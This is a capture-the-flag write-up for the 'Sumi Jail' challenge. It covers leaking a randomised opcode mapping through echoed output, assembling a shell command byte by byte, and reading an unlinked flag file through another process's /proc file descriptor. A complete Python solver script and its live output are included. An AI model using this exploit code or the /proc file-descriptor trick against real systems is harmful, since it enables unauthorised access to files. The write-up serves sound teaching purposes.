# Sumi Jail

| Event | Category | Difficulty | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Jail / Misc | Medium | `csaw{bu1lt_th3_wh0l3_c0mm4nd_by_h4nd}` |

**TL;DR** — A four-key register machine (`w e s d`, mapped to `inc`, `dbl`, `dep`, `exe` in a
random order per connection) lets you build a shell command one byte at a time. You get **two
lines per connection**. Line 1 is a probe whose echoed deposits uniquely identify the mapping
out of all 24 permutations; line 2 builds and runs the real command. `/flag.txt` is a decoy — the
real flag is read through `/proc` from an open file descriptor of a same-uid process.

---

## 1. The machine

After a proof of work (200 chained modular square roots, solved with the handout's `solve_pow.py`
logic), the service accepts **two lines** of `wesd` keys.

| Op | Effect |
|---|---|
| `inc` | `acc += 1` |
| `dbl` | `acc *= 2` |
| `dep` | append `chr(acc & 0xFF)` to the command buffer, reset `acc` |
| `exe` | run the buffer as a shell command (once per shot) |

The mapping from keys to ops is randomised per connection, and you only get two shots. Guessing
burns one of them.

---

## 2. Recovering the mapping with one probe

The oracle: **every `dep` is echoed back as `[0xNN]`, whatever the mapping is.** The server tells
you the value of the accumulator at each deposit, which is a direct readout of how many `inc`s
and `dbl`s preceded it — and therefore which keys those were.

There are only `4! = 24` possible mappings, so the problem is small enough to solve offline:
simulate a candidate key sequence under all 24 mappings and look for a sequence whose **deposit
trace is distinct for every one of them**. A random search finds one almost immediately; the
14-key sequence `eseewdwswdswse` works.

Send it as shot 1, match the echoed bytes against the simulation, and the mapping is pinned
exactly — no guessing, no wasted shot. For example, `[0x00][0x03][0x02][0x01]` means
`w=inc, e=exe, s=dep, d=dbl`.

---

## 3. Building a command

With the mapping known, each byte is encoded from its binary representation using the classic
double-and-add construction:

- one `inc` for the leading bit,
- then for each remaining bit: `dbl`, plus `inc` if the bit is 1,
- then `dep`.

That is `O(log n)` keys per byte rather than `O(n)` — building `~` (126) takes 12 keys instead of
126. A final `exe` runs the buffer, and the command's stdout comes back on the socket.

---

## 4. Skipping the decoy

```sh
cat /flag.txt
# -> csaw{congratulations_you_win}
```

That is a decoy. Dumping `/chal/entrypoint.sh` shows why:

```sh
install -m 0444 /opt/real_flag.txt /run/real_flag.txt
exec 3< /run/real_flag.txt
rm -f /run/real_flag.txt
...
spawn_holder() {
    setpriv --reuid=ctf --regid=ctf --clear-groups sleep infinity &
    HOLDER_PID=$!
    printf '%d\n' "$HOLDER_PID" > /run/holder.pid
```

The real flag file is **unlinked**, but a `sleep infinity` process still holds it open on file
descriptor 3 — and that process runs as `ctf`, the same user as the jail shell. On Linux an
unlinked file survives as long as a descriptor references it, and `/proc/<pid>/fd/3` is a usable
path to it for any process with matching credentials.

The PID is helpfully written to `/run/holder.pid`, so shot 2 is:

```sh
cat /proc/$(cat /run/holder.pid)/fd/3
```

---

## 5. Solver

```python
#!/usr/bin/env python3
# solve.py — Sumi Jail. usage: python3 solve.py HOST PORT
import hashlib, itertools, random, re, socket, sys

HOST, PORT = sys.argv[1], int(sys.argv[2])
CMD = "cat /proc/$(cat /run/holder.pid)/fd/3"

# --- proof of work (from the handout's solve_pow.py) ---
P = (1 << 2203) - 1
E = (P + 1) // 4


def pow_solve(challenge):
    _, depth, nonce = challenge.split(".")
    blob = b"".join(hashlib.sha512(b"sumi-pow-v1|" + bytes.fromhex(nonce) + bytes([i])).digest()
                    for i in range(5))
    x = int.from_bytes(blob, "big") % P
    for _ in range(int(depth)):
        r = pow(x, E, P)
        x = r if (r & 1) == (0 if r * r % P == x else 1) else P - r
    return format(x, "x")


# --- model of the register machine ---
PERMS = [dict(zip("wesd", p)) for p in itertools.permutations(("inc", "dbl", "dep", "exe"))]


def deposits(seq, m):
    """Bytes the server echoes as [0xNN] for key sequence seq under mapping m."""
    acc, out = 0, []
    for k in seq:
        if m[k] == "inc":
            acc += 1
        elif m[k] == "dbl":
            acc *= 2
        elif m[k] == "dep":
            out.append(acc & 0xFF)
            acc = 0
    return tuple(out)


def find_probe():
    """A short key sequence whose deposit trace is unique across all 24 mappings."""
    random.seed(1)
    while True:
        seq = "".join(random.choice("wesd") for _ in range(14))
        if len({deposits(seq, m) for m in PERMS}) == 24:
            return seq


def encode(cmd, m):
    """Build cmd byte by byte: inc for the top bit, then dbl (+inc) per bit, then dep."""
    k = {op: key for key, op in m.items()}
    out = ""
    for byte in cmd.encode():
        bits = bin(byte)[2:]
        out += k["inc"]
        for bit in bits[1:]:
            out += k["dbl"] + (k["inc"] if bit == "1" else "")
        out += k["dep"]
    return out + k["exe"]


def recv_until(s, marker):
    data = ""
    while marker not in data:
        chunk = s.recv(65536).decode(errors="replace")
        if not chunk:
            break
        data += chunk
    return data


s = socket.create_connection((HOST, PORT), timeout=30)
banner = recv_until(s, "answer:")
s.sendall(pow_solve(re.search(r"sumi1\.\d+\.[0-9a-f]+", banner).group(0)).encode() + b"\n")
recv_until(s, "two shots.")

# shot 1: identify the mapping from the echoed deposits
probe = find_probe()
s.sendall(probe.encode() + b"\n")
reply = recv_until(s, "[shot 2]").split("ops", 1)[1]
seen = tuple(int(h, 16) for h in re.findall(r"\[0x([0-9a-f]{2})\]", reply))
mapping = next(m for m in PERMS if deposits(probe, m) == seen)
print("mapping:", mapping)

# shot 2: run the command that reads the real flag
s.sendall(encode(CMD, mapping).encode() + b"\n")
s.settimeout(10)
out = ""
try:
    while not re.search(r"csaw\{[^}]*\}", out):
        chunk = s.recv(65536).decode(errors="replace")
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass
print(re.search(r"csaw\{[^}]*\}", out).group(0))
```

Output against the live instance:

```
mapping: {'w': 'dep', 'e': 'inc', 's': 'exe', 'd': 'dbl'}
csaw{bu1lt_th3_wh0l3_c0mm4nd_by_h4nd}
```

Stdlib only.

---

## Flag

```
csaw{bu1lt_th3_wh0l3_c0mm4nd_by_h4nd}
```

---

## Takeaways

- **Echoed state is a free oracle.** The `[0xNN]` confirmation was meant as user feedback and
  instead leaks the entire secret mapping in one line.
- **Design the probe offline.** With only two shots, a locally verified "distinguishes all 24
  permutations" sequence turns a coin flip into a certainty.
- **`rm` does not delete an open file.** Unlinking while a descriptor is held is a common way to
  "hide" a flag, and `/proc/<pid>/fd/N` reads it straight back for any same-uid process.
- **Expect the easy flag to be a decoy** when the challenge goes to the trouble of spawning a
  holder process. Read the entrypoint before trusting the obvious file.
